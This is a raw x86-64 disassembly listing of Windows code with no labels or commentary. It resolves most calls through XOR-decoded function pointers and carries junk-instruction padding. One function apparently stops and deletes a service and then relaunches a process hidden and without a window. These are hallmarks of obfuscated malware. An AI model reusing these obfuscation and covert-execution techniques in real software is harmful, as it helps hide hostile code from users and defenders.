  402dbe:	48 31 c0             	xor    %rax,%rax
  402dc1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402dc8:	90                   	nop
  402dc9:	55                   	push   %rbp
  402dca:	48 89 e5             	mov    %rsp,%rbp
  402dcd:	48 81 ec 50 00 00 00 	sub    $0x50,%rsp
  402dd4:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  402dd8:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  402ddc:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  402de0:	48 8d 05 69 65 00 00 	lea    0x6569(%rip),%rax        # 0x409350
  402de7:	49 89 c2             	mov    %rax,%r10
  402dea:	4c 89 d1             	mov    %r10,%rcx
  402ded:	4c 8b 1d f4 89 00 00 	mov    0x89f4(%rip),%r11        # 0x40b7e8
  402df4:	48 8b 05 15 8a 00 00 	mov    0x8a15(%rip),%rax        # 0x40b810
  402dfb:	4c 33 18             	xor    (%rax),%r11
  402dfe:	41 ff d3             	call   *%r11
  402e01:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  402e05:	48 8d 05 66 65 00 00 	lea    0x6566(%rip),%rax        # 0x409372
  402e0c:	49 89 c2             	mov    %rax,%r10
  402e0f:	4c 89 d1             	mov    %r10,%rcx
  402e12:	4c 8b 1d 07 8a 00 00 	mov    0x8a07(%rip),%r11        # 0x40b820
  402e19:	48 8b 05 28 8a 00 00 	mov    0x8a28(%rip),%rax        # 0x40b848
  402e20:	4c 33 18             	xor    (%rax),%r11
  402e23:	41 ff d3             	call   *%r11
  402e26:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  402e2a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402e2e:	48 83 f8 00          	cmp    $0x0,%rax
  402e32:	0f 84 6a 00 00 00    	je     0x402ea2
  402e38:	48 8d 05 4f 65 00 00 	lea    0x654f(%rip),%rax        # 0x40938e
  402e3f:	49 89 c3             	mov    %rax,%r11
  402e42:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402e46:	49 89 c2             	mov    %rax,%r10
  402e49:	4c 89 d1             	mov    %r10,%rcx
  402e4c:	4c 89 da             	mov    %r11,%rdx
  402e4f:	4c 8b 1d 02 8a 00 00 	mov    0x8a02(%rip),%r11        # 0x40b858
  402e56:	48 8b 05 23 8a 00 00 	mov    0x8a23(%rip),%rax        # 0x40b880
  402e5d:	4c 33 18             	xor    (%rax),%r11
  402e60:	41 ff d3             	call   *%r11
  402e63:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  402e67:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402e6b:	48 83 f8 00          	cmp    $0x0,%rax
  402e6f:	0f 84 2d 00 00 00    	je     0x402ea2
  402e75:	31 c0                	xor    %eax,%eax
  402e77:	49 89 c1             	mov    %rax,%r9
  402e7a:	48 8b 45 20          	mov    0x20(%rbp),%rax
  402e7e:	49 89 c0             	mov    %rax,%r8
  402e81:	b8 00 00 00 00       	mov    $0x0,%eax
  402e86:	49 89 c3             	mov    %rax,%r11
  402e89:	48 8b 45 18          	mov    0x18(%rbp),%rax
  402e8d:	49 89 c2             	mov    %rax,%r10
  402e90:	4c 89 d1             	mov    %r10,%rcx
  402e93:	4c 89 da             	mov    %r11,%rdx
  402e96:	4c 8b 5d e8          	mov    -0x18(%rbp),%r11
  402e9a:	41 ff d3             	call   *%r11
  402e9d:	e9 7a 00 00 00       	jmp    0x402f1c
  402ea2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  402ea6:	48 83 f8 00          	cmp    $0x0,%rax
  402eaa:	0f 84 6c 00 00 00    	je     0x402f1c
  402eb0:	48 8d 05 fa 64 00 00 	lea    0x64fa(%rip),%rax        # 0x4093b1
  402eb7:	49 89 c3             	mov    %rax,%r11
  402eba:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  402ebe:	49 89 c2             	mov    %rax,%r10
  402ec1:	4c 89 d1             	mov    %r10,%rcx
  402ec4:	4c 89 da             	mov    %r11,%rdx
  402ec7:	4c 8b 1d c2 89 00 00 	mov    0x89c2(%rip),%r11        # 0x40b890
  402ece:	48 8b 05 e3 89 00 00 	mov    0x89e3(%rip),%rax        # 0x40b8b8
  402ed5:	4c 33 18             	xor    (%rax),%r11
  402ed8:	41 ff d3             	call   *%r11
  402edb:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  402edf:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  402ee3:	48 83 f8 00          	cmp    $0x0,%rax
  402ee7:	0f 84 2f 00 00 00    	je     0x402f1c
  402eed:	31 c0                	xor    %eax,%eax
  402eef:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  402ef4:	b8 00 00 00 00       	mov    $0x0,%eax
  402ef9:	49 89 c1             	mov    %rax,%r9
  402efc:	31 c0                	xor    %eax,%eax
  402efe:	49 89 c0             	mov    %rax,%r8
  402f01:	48 8b 45 20          	mov    0x20(%rbp),%rax
  402f05:	49 89 c3             	mov    %rax,%r11
  402f08:	48 8b 45 18          	mov    0x18(%rbp),%rax
  402f0c:	49 89 c2             	mov    %rax,%r10
  402f0f:	4c 89 d1             	mov    %r10,%rcx
  402f12:	4c 89 da             	mov    %r11,%rdx
  402f15:	4c 8b 5d e0          	mov    -0x20(%rbp),%r11
  402f19:	41 ff d3             	call   *%r11
  402f1c:	c9                   	leave
  402f1d:	c3                   	ret
  402f1e:	cc                   	int3
  402f1f:	cc                   	int3
  402f20:	e8 00 00 00 00       	call   0x402f25
  402f25:	48 83 c4 08          	add    $0x8,%rsp
  402f29:	c3                   	ret
  402f2a:	90                   	nop
  402f2b:	90                   	nop
  402f2c:	cc                   	int3
  402f2d:	90                   	nop
  402f2e:	eb 0b                	jmp    0x402f3b
  402f30:	48 31 c0             	xor    %rax,%rax
  402f33:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402f3a:	90                   	nop
  402f3b:	55                   	push   %rbp
  402f3c:	48 89 e5             	mov    %rsp,%rbp
  402f3f:	48 81 ec 40 03 00 00 	sub    $0x340,%rsp
  402f46:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  402f4a:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  402f4e:	48 8d 05 73 5e 00 00 	lea    0x5e73(%rip),%rax        # 0x408dc8
  402f55:	49 89 c2             	mov    %rax,%r10
  402f58:	4c 89 d1             	mov    %r10,%rcx
  402f5b:	4c 8b 1d 8e 71 00 00 	mov    0x718e(%rip),%r11        # 0x40a0f0
  402f62:	48 8b 05 af 71 00 00 	mov    0x71af(%rip),%rax        # 0x40a118
  402f69:	4c 33 18             	xor    (%rax),%r11
  402f6c:	41 ff d3             	call   *%r11
  402f6f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  402f73:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402f77:	48 83 f8 00          	cmp    $0x0,%rax
  402f7b:	0f 85 0a 00 00 00    	jne    0x402f8b
  402f81:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402f86:	e9 6e 04 00 00       	jmp    0x4033f9
  402f8b:	48 8d 05 58 5e 00 00 	lea    0x5e58(%rip),%rax        # 0x408dea
  402f92:	49 89 c3             	mov    %rax,%r11
  402f95:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402f99:	49 89 c2             	mov    %rax,%r10
  402f9c:	4c 89 d1             	mov    %r10,%rcx
  402f9f:	4c 89 da             	mov    %r11,%rdx
  402fa2:	4c 8b 1d 7f 71 00 00 	mov    0x717f(%rip),%r11        # 0x40a128
  402fa9:	48 8b 05 a0 71 00 00 	mov    0x71a0(%rip),%rax        # 0x40a150
  402fb0:	4c 33 18             	xor    (%rax),%r11
  402fb3:	41 ff d3             	call   *%r11
  402fb6:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  402fba:	48 8d 05 40 5e 00 00 	lea    0x5e40(%rip),%rax        # 0x408e01
  402fc1:	49 89 c3             	mov    %rax,%r11
  402fc4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402fc8:	49 89 c2             	mov    %rax,%r10
  402fcb:	4c 89 d1             	mov    %r10,%rcx
  402fce:	4c 89 da             	mov    %r11,%rdx
  402fd1:	4c 8b 1d 88 71 00 00 	mov    0x7188(%rip),%r11        # 0x40a160
  402fd8:	48 8b 05 a9 71 00 00 	mov    0x71a9(%rip),%rax        # 0x40a188
  402fdf:	4c 33 18             	xor    (%rax),%r11
  402fe2:	41 ff d3             	call   *%r11
  402fe5:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  402fe9:	48 8d 05 26 5e 00 00 	lea    0x5e26(%rip),%rax        # 0x408e16
  402ff0:	49 89 c3             	mov    %rax,%r11
  402ff3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402ff7:	49 89 c2             	mov    %rax,%r10
  402ffa:	4c 89 d1             	mov    %r10,%rcx
  402ffd:	4c 89 da             	mov    %r11,%rdx
  403000:	4c 8b 1d 91 71 00 00 	mov    0x7191(%rip),%r11        # 0x40a198
  403007:	48 8b 05 b2 71 00 00 	mov    0x71b2(%rip),%rax        # 0x40a1c0
  40300e:	4c 33 18             	xor    (%rax),%r11
  403011:	41 ff d3             	call   *%r11
  403014:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  403018:	48 8d 05 0d 5e 00 00 	lea    0x5e0d(%rip),%rax        # 0x408e2c
  40301f:	49 89 c3             	mov    %rax,%r11
  403022:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403026:	49 89 c2             	mov    %rax,%r10
  403029:	4c 89 d1             	mov    %r10,%rcx
  40302c:	4c 89 da             	mov    %r11,%rdx
  40302f:	4c 8b 1d 9a 71 00 00 	mov    0x719a(%rip),%r11        # 0x40a1d0
  403036:	48 8b 05 bb 71 00 00 	mov    0x71bb(%rip),%rax        # 0x40a1f8
  40303d:	4c 33 18             	xor    (%rax),%r11
  403040:	41 ff d3             	call   *%r11
  403043:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  403047:	48 8d 05 f9 5d 00 00 	lea    0x5df9(%rip),%rax        # 0x408e47
  40304e:	49 89 c3             	mov    %rax,%r11
  403051:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403055:	49 89 c2             	mov    %rax,%r10
  403058:	4c 89 d1             	mov    %r10,%rcx
  40305b:	4c 89 da             	mov    %r11,%rdx
  40305e:	4c 8b 1d a3 71 00 00 	mov    0x71a3(%rip),%r11        # 0x40a208
  403065:	48 8b 05 c4 71 00 00 	mov    0x71c4(%rip),%rax        # 0x40a230
  40306c:	4c 33 18             	xor    (%rax),%r11
  40306f:	41 ff d3             	call   *%r11
  403072:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  403076:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40307a:	48 83 f8 00          	cmp    $0x0,%rax
  40307e:	0f 84 38 00 00 00    	je     0x4030bc
  403084:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  403088:	48 83 f8 00          	cmp    $0x0,%rax
  40308c:	0f 84 2a 00 00 00    	je     0x4030bc
  403092:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  403096:	48 83 f8 00          	cmp    $0x0,%rax
  40309a:	0f 84 1c 00 00 00    	je     0x4030bc
  4030a0:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4030a4:	48 83 f8 00          	cmp    $0x0,%rax
  4030a8:	0f 84 0e 00 00 00    	je     0x4030bc
  4030ae:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4030b2:	48 83 f8 00          	cmp    $0x0,%rax
  4030b6:	0f 85 28 00 00 00    	jne    0x4030e4
  4030bc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4030c0:	49 89 c2             	mov    %rax,%r10
  4030c3:	4c 89 d1             	mov    %r10,%rcx
  4030c6:	4c 8b 1d 73 71 00 00 	mov    0x7173(%rip),%r11        # 0x40a240
  4030cd:	48 8b 05 94 71 00 00 	mov    0x7194(%rip),%rax        # 0x40a268
  4030d4:	4c 33 18             	xor    (%rax),%r11
  4030d7:	41 ff d3             	call   *%r11
  4030da:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4030df:	e9 15 03 00 00       	jmp    0x4033f9
  4030e4:	b8 02 00 00 00       	mov    $0x2,%eax
  4030e9:	49 89 c0             	mov    %rax,%r8
  4030ec:	31 c0                	xor    %eax,%eax
  4030ee:	49 89 c3             	mov    %rax,%r11
  4030f1:	31 c0                	xor    %eax,%eax
  4030f3:	49 89 c2             	mov    %rax,%r10
  4030f6:	4c 89 d1             	mov    %r10,%rcx
  4030f9:	4c 89 da             	mov    %r11,%rdx
  4030fc:	4c 8b 5d f0          	mov    -0x10(%rbp),%r11
  403100:	41 ff d3             	call   *%r11
  403103:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  403107:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40310b:	48 83 f8 00          	cmp    $0x0,%rax
  40310f:	0f 85 28 00 00 00    	jne    0x40313d
  403115:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403119:	49 89 c2             	mov    %rax,%r10
  40311c:	4c 89 d1             	mov    %r10,%rcx
  40311f:	4c 8b 1d 52 71 00 00 	mov    0x7152(%rip),%r11        # 0x40a278
  403126:	48 8b 05 73 71 00 00 	mov    0x7173(%rip),%rax        # 0x40a2a0
  40312d:	4c 33 18             	xor    (%rax),%r11
  403130:	41 ff d3             	call   *%r11
  403133:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403138:	e9 bc 02 00 00       	jmp    0x4033f9
  40313d:	b8 ff 01 0f 00       	mov    $0xf01ff,%eax
  403142:	49 89 c0             	mov    %rax,%r8
  403145:	48 8b 45 18          	mov    0x18(%rbp),%rax
  403149:	49 89 c3             	mov    %rax,%r11
  40314c:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  403150:	49 89 c2             	mov    %rax,%r10
  403153:	4c 89 d1             	mov    %r10,%rcx
  403156:	4c 89 da             	mov    %r11,%rdx
  403159:	4c 8b 5d e8          	mov    -0x18(%rbp),%r11
  40315d:	41 ff d3             	call   *%r11
  403160:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  403164:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  403168:	48 83 f8 00          	cmp    $0x0,%rax
  40316c:	0f 85 39 00 00 00    	jne    0x4031ab
  403172:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  403176:	49 89 c2             	mov    %rax,%r10
  403179:	4c 89 d1             	mov    %r10,%rcx
  40317c:	4c 8b 5d d0          	mov    -0x30(%rbp),%r11
  403180:	41 ff d3             	call   *%r11
  403183:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403187:	49 89 c2             	mov    %rax,%r10
  40318a:	4c 89 d1             	mov    %r10,%rcx
  40318d:	4c 8b 1d 1c 71 00 00 	mov    0x711c(%rip),%r11        # 0x40a2b0
  403194:	48 8b 05 3d 71 00 00 	mov    0x713d(%rip),%rax        # 0x40a2d8
  40319b:	4c 33 18             	xor    (%rax),%r11
  40319e:	41 ff d3             	call   *%r11
  4031a1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4031a6:	e9 4e 02 00 00       	jmp    0x4033f9
  4031ab:	48 8d 45 a4          	lea    -0x5c(%rbp),%rax
  4031af:	49 89 c3             	mov    %rax,%r11
  4031b2:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4031b6:	49 89 c2             	mov    %rax,%r10
  4031b9:	4c 89 d1             	mov    %r10,%rcx
  4031bc:	4c 89 da             	mov    %r11,%rdx
  4031bf:	4c 8b 5d d8          	mov    -0x28(%rbp),%r11
  4031c3:	41 ff d3             	call   *%r11
  4031c6:	31 c0                	xor    %eax,%eax
  4031c8:	49 89 c0             	mov    %rax,%r8
  4031cb:	b8 00 00 00 00       	mov    $0x0,%eax
  4031d0:	49 89 c3             	mov    %rax,%r11
  4031d3:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4031d7:	49 89 c2             	mov    %rax,%r10
  4031da:	4c 89 d1             	mov    %r10,%rcx
  4031dd:	4c 89 da             	mov    %r11,%rdx
  4031e0:	4c 8b 5d e0          	mov    -0x20(%rbp),%r11
  4031e4:	41 ff d3             	call   *%r11
  4031e7:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4031eb:	49 89 c2             	mov    %rax,%r10
  4031ee:	4c 89 d1             	mov    %r10,%rcx
  4031f1:	4c 8b 5d d0          	mov    -0x30(%rbp),%r11
  4031f5:	41 ff d3             	call   *%r11
  4031f8:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4031fc:	49 89 c2             	mov    %rax,%r10
  4031ff:	4c 89 d1             	mov    %r10,%rcx
  403202:	4c 8b 5d d0          	mov    -0x30(%rbp),%r11
  403206:	41 ff d3             	call   *%r11
  403209:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40320d:	49 89 c2             	mov    %rax,%r10
  403210:	4c 89 d1             	mov    %r10,%rcx
  403213:	4c 8b 1d ce 70 00 00 	mov    0x70ce(%rip),%r11        # 0x40a2e8
  40321a:	48 8b 05 ef 70 00 00 	mov    0x70ef(%rip),%rax        # 0x40a310
  403221:	4c 33 18             	xor    (%rax),%r11
  403224:	41 ff d3             	call   *%r11
  403227:	b8 a4 83 f3 81       	mov    $0x81f383a4,%eax
  40322c:	81 f0 ac 81 f3 81    	xor    $0x81f381ac,%eax
  403232:	49 89 c0             	mov    %rax,%r8
  403235:	b8 00 00 00 00       	mov    $0x0,%eax
  40323a:	49 89 c3             	mov    %rax,%r11
  40323d:	48 8d 85 9c fd ff ff 	lea    -0x264(%rbp),%rax
  403244:	49 89 c2             	mov    %rax,%r10
  403247:	4c 89 d1             	mov    %r10,%rcx
  40324a:	4c 89 da             	mov    %r11,%rdx
  40324d:	4c 8b 1d cc 70 00 00 	mov    0x70cc(%rip),%r11        # 0x40a320
  403254:	48 8b 05 ed 70 00 00 	mov    0x70ed(%rip),%rax        # 0x40a348
  40325b:	4c 33 18             	xor    (%rax),%r11
  40325e:	41 ff d3             	call   *%r11
  403261:	b8 04 01 00 00       	mov    $0x104,%eax
  403266:	49 89 c0             	mov    %rax,%r8
  403269:	48 8d 85 9c fd ff ff 	lea    -0x264(%rbp),%rax
  403270:	49 89 c3             	mov    %rax,%r11
  403273:	31 c0                	xor    %eax,%eax
  403275:	49 89 c2             	mov    %rax,%r10
  403278:	4c 89 d1             	mov    %r10,%rcx
  40327b:	4c 89 da             	mov    %r11,%rdx
  40327e:	4c 8b 1d d3 70 00 00 	mov    0x70d3(%rip),%r11        # 0x40a358
  403285:	48 8b 05 f4 70 00 00 	mov    0x70f4(%rip),%rax        # 0x40a380
  40328c:	4c 33 18             	xor    (%rax),%r11
  40328f:	41 ff d3             	call   *%r11
  403292:	b8 2b 5f 8a b0       	mov    $0xb08a5f2b,%eax
  403297:	81 f0 43 5f 8a b0    	xor    $0xb08a5f43,%eax
  40329d:	49 89 c0             	mov    %rax,%r8
  4032a0:	b8 00 00 00 00       	mov    $0x0,%eax
  4032a5:	49 89 c3             	mov    %rax,%r11
  4032a8:	48 8d 85 30 fd ff ff 	lea    -0x2d0(%rbp),%rax
  4032af:	49 89 c2             	mov    %rax,%r10
  4032b2:	4c 89 d1             	mov    %r10,%rcx
  4032b5:	4c 89 da             	mov    %r11,%rdx
  4032b8:	4c 8b 1d d1 70 00 00 	mov    0x70d1(%rip),%r11        # 0x40a390
  4032bf:	48 8b 05 f2 70 00 00 	mov    0x70f2(%rip),%rax        # 0x40a3b8
  4032c6:	4c 33 18             	xor    (%rax),%r11
  4032c9:	41 ff d3             	call   *%r11
  4032cc:	b8 18 00 00 00       	mov    $0x18,%eax
  4032d1:	49 89 c0             	mov    %rax,%r8
  4032d4:	b8 00 00 00 00       	mov    $0x0,%eax
  4032d9:	49 89 c3             	mov    %rax,%r11
  4032dc:	48 8d 85 18 fd ff ff 	lea    -0x2e8(%rbp),%rax
  4032e3:	49 89 c2             	mov    %rax,%r10
  4032e6:	4c 89 d1             	mov    %r10,%rcx
  4032e9:	4c 89 da             	mov    %r11,%rdx
  4032ec:	4c 8b 1d d5 70 00 00 	mov    0x70d5(%rip),%r11        # 0x40a3c8
  4032f3:	48 8b 05 f6 70 00 00 	mov    0x70f6(%rip),%rax        # 0x40a3f0
  4032fa:	4c 33 18             	xor    (%rax),%r11
  4032fd:	41 ff d3             	call   *%r11
  403300:	b8 68 00 00 00       	mov    $0x68,%eax
  403305:	89 85 30 fd ff ff    	mov    %eax,-0x2d0(%rbp)
  40330b:	b8 01 00 00 00       	mov    $0x1,%eax
  403310:	89 85 6c fd ff ff    	mov    %eax,-0x294(%rbp)
  403316:	b8 00 00 00 00       	mov    $0x0,%eax
  40331b:	66 89 85 70 fd ff ff 	mov    %ax,-0x290(%rbp)
  403322:	48 8d 85 18 fd ff ff 	lea    -0x2e8(%rbp),%rax
  403329:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
  40332e:	48 8d 85 30 fd ff ff 	lea    -0x2d0(%rbp),%rax
  403335:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
  40333a:	31 c0                	xor    %eax,%eax
  40333c:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  403341:	31 c0                	xor    %eax,%eax
  403343:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  403348:	b8 00 00 00 08       	mov    $0x8000000,%eax
  40334d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  403352:	b8 00 00 00 00       	mov    $0x0,%eax
  403357:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40335c:	31 c0                	xor    %eax,%eax
  40335e:	49 89 c1             	mov    %rax,%r9
  403361:	31 c0                	xor    %eax,%eax
  403363:	49 89 c0             	mov    %rax,%r8
  403366:	31 c0                	xor    %eax,%eax
  403368:	49 89 c3             	mov    %rax,%r11
  40336b:	48 8d 85 9c fd ff ff 	lea    -0x264(%rbp),%rax
  403372:	49 89 c2             	mov    %rax,%r10
  403375:	4c 89 d1             	mov    %r10,%rcx
  403378:	4c 89 da             	mov    %r11,%rdx
  40337b:	4c 8b 1d 7e 70 00 00 	mov    0x707e(%rip),%r11        # 0x40a400
  403382:	48 8b 05 9f 70 00 00 	mov    0x709f(%rip),%rax        # 0x40a428
  403389:	4c 33 18             	xor    (%rax),%r11
  40338c:	41 ff d3             	call   *%r11
  40338f:	83 f8 00             	cmp    $0x0,%eax
  403392:	0f 84 42 00 00 00    	je     0x4033da
  403398:	48 8b 85 20 fd ff ff 	mov    -0x2e0(%rbp),%rax
  40339f:	49 89 c2             	mov    %rax,%r10
  4033a2:	4c 89 d1             	mov    %r10,%rcx
  4033a5:	4c 8b 1d 8c 70 00 00 	mov    0x708c(%rip),%r11        # 0x40a438
  4033ac:	48 8b 05 ad 70 00 00 	mov    0x70ad(%rip),%rax        # 0x40a460
  4033b3:	4c 33 18             	xor    (%rax),%r11
  4033b6:	41 ff d3             	call   *%r11
  4033b9:	48 8b 85 18 fd ff ff 	mov    -0x2e8(%rbp),%rax
  4033c0:	49 89 c2             	mov    %rax,%r10
  4033c3:	4c 89 d1             	mov    %r10,%rcx
  4033c6:	4c 8b 1d a3 70 00 00 	mov    0x70a3(%rip),%r11        # 0x40a470
  4033cd:	48 8b 05 c4 70 00 00 	mov    0x70c4(%rip),%rax        # 0x40a498
  4033d4:	4c 33 18             	xor    (%rax),%r11
  4033d7:	41 ff d3             	call   *%r11
  4033da:	b8 00 00 00 00       	mov    $0x0,%eax
  4033df:	49 89 c2             	mov    %rax,%r10
  4033e2:	4c 89 d1             	mov    %r10,%rcx
  4033e5:	4c 8b 1d bc 70 00 00 	mov    0x70bc(%rip),%r11        # 0x40a4a8
  4033ec:	48 8b 05 dd 70 00 00 	mov    0x70dd(%rip),%rax        # 0x40a4d0
  4033f3:	4c 33 18             	xor    (%rax),%r11
  4033f6:	41 ff d3             	call   *%r11
  4033f9:	c9                   	leave
  4033fa:	c3                   	ret
  4033fb:	cc                   	int3
  4033fc:	cc                   	int3
  4033fd:	e8 00 00 00 00       	call   0x403402
  403402:	48 83 c4 08          	add    $0x8,%rsp
  403406:	c3                   	ret
  403407:	90                   	nop
  403408:	90                   	nop
  403409:	cc                   	int3
  40340a:	90                   	nop
  40340b:	eb 0b                	jmp    0x403418
  40340d:	48 31 c0             	xor    %rax,%rax
  403410:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403417:	90                   	nop
  403418:	55                   	push   %rbp
  403419:	48 89 e5             	mov    %rsp,%rbp
  40341c:	48 81 ec 30 00 00 00 	sub    $0x30,%rsp
  403423:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  403427:	48 8d 05 e4 5a 00 00 	lea    0x5ae4(%rip),%rax        # 0x408f12
  40342e:	49 89 c3             	mov    %rax,%r11
  403431:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403435:	49 89 c2             	mov    %rax,%r10
  403438:	4c 89 d1             	mov    %r10,%rcx
  40343b:	4c 89 da             	mov    %r11,%rdx
  40343e:	4c 8b 1d cb 72 00 00 	mov    0x72cb(%rip),%r11        # 0x40a710
  403445:	48 8b 05 ec 72 00 00 	mov    0x72ec(%rip),%rax        # 0x40a738
  40344c:	4c 33 18             	xor    (%rax),%r11
  40344f:	41 ff d3             	call   *%r11
  403452:	89 45 fc             	mov    %eax,-0x4(%rbp)
  403455:	8b 45 fc             	mov    -0x4(%rbp),%eax
  403458:	83 f8 00             	cmp    $0x0,%eax
  40345b:	0f 84 b9 00 00 00    	je     0x40351a
  403461:	b8 00 00 00 00       	mov    $0x0,%eax
  403466:	89 45 f8             	mov    %eax,-0x8(%rbp)
  403469:	8b 45 f8             	mov    -0x8(%rbp),%eax
  40346c:	83 f8 0a             	cmp    $0xa,%eax
  40346f:	0f 8d a0 00 00 00    	jge    0x403515
  403475:	e9 0d 00 00 00       	jmp    0x403487
  40347a:	8b 45 f8             	mov    -0x8(%rbp),%eax
  40347d:	89 c1                	mov    %eax,%ecx
  40347f:	83 c0 01             	add    $0x1,%eax
  403482:	89 45 f8             	mov    %eax,-0x8(%rbp)
  403485:	eb e2                	jmp    0x403469
  403487:	48 8d 05 a4 5a 00 00 	lea    0x5aa4(%rip),%rax        # 0x408f32
  40348e:	49 89 c3             	mov    %rax,%r11
  403491:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403495:	49 89 c2             	mov    %rax,%r10
  403498:	4c 89 d1             	mov    %r10,%rcx
  40349b:	4c 89 da             	mov    %r11,%rdx
  40349e:	4c 8b 1d a3 72 00 00 	mov    0x72a3(%rip),%r11        # 0x40a748
  4034a5:	48 8b 05 c4 72 00 00 	mov    0x72c4(%rip),%rax        # 0x40a770
  4034ac:	4c 33 18             	xor    (%rax),%r11
  4034af:	41 ff d3             	call   *%r11
  4034b2:	89 45 fc             	mov    %eax,-0x4(%rbp)
  4034b5:	8b 45 fc             	mov    -0x4(%rbp),%eax
  4034b8:	83 f8 00             	cmp    $0x0,%eax
  4034bb:	0f 86 05 00 00 00    	jbe    0x4034c6
  4034c1:	e9 4f 00 00 00       	jmp    0x403515
  4034c6:	48 8d 05 75 5a 00 00 	lea    0x5a75(%rip),%rax        # 0x408f42
  4034cd:	49 89 c3             	mov    %rax,%r11
  4034d0:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4034d4:	49 89 c2             	mov    %rax,%r10
  4034d7:	4c 89 d1             	mov    %r10,%rcx
  4034da:	4c 89 da             	mov    %r11,%rdx
  4034dd:	4c 8b 1d 9c 72 00 00 	mov    0x729c(%rip),%r11        # 0x40a780
  4034e4:	48 8b 05 bd 72 00 00 	mov    0x72bd(%rip),%rax        # 0x40a7a8
  4034eb:	4c 33 18             	xor    (%rax),%r11
  4034ee:	41 ff d3             	call   *%r11
  4034f1:	b8 e8 03 00 00       	mov    $0x3e8,%eax
  4034f6:	49 89 c2             	mov    %rax,%r10
  4034f9:	4c 89 d1             	mov    %r10,%rcx
  4034fc:	4c 8b 1d b5 72 00 00 	mov    0x72b5(%rip),%r11        # 0x40a7b8
  403503:	48 8b 05 d6 72 00 00 	mov    0x72d6(%rip),%rax        # 0x40a7e0
  40350a:	4c 33 18             	xor    (%rax),%r11
  40350d:	41 ff d3             	call   *%r11
  403510:	e9 65 ff ff ff       	jmp    0x40347a
  403515:	e9 1b 01 00 00       	jmp    0x403635
  40351a:	48 8d 05 39 5a 00 00 	lea    0x5a39(%rip),%rax        # 0x408f5a
  403521:	49 89 c3             	mov    %rax,%r11
  403524:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403528:	49 89 c2             	mov    %rax,%r10
  40352b:	4c 89 d1             	mov    %r10,%rcx
  40352e:	4c 89 da             	mov    %r11,%rdx
  403531:	4c 8b 1d b8 72 00 00 	mov    0x72b8(%rip),%r11        # 0x40a7f0
  403538:	48 8b 05 d9 72 00 00 	mov    0x72d9(%rip),%rax        # 0x40a818
  40353f:	4c 33 18             	xor    (%rax),%r11
  403542:	41 ff d3             	call   *%r11
  403545:	83 f8 00             	cmp    $0x0,%eax
  403548:	0f 8e b9 00 00 00    	jle    0x403607
  40354e:	b8 00 00 00 00       	mov    $0x0,%eax
  403553:	89 45 f4             	mov    %eax,-0xc(%rbp)
  403556:	8b 45 f4             	mov    -0xc(%rbp),%eax
  403559:	83 f8 0a             	cmp    $0xa,%eax
  40355c:	0f 8d a0 00 00 00    	jge    0x403602
  403562:	e9 0d 00 00 00       	jmp    0x403574
  403567:	8b 45 f4             	mov    -0xc(%rbp),%eax
  40356a:	89 c1                	mov    %eax,%ecx
  40356c:	83 c0 01             	add    $0x1,%eax
  40356f:	89 45 f4             	mov    %eax,-0xc(%rbp)
  403572:	eb e2                	jmp    0x403556
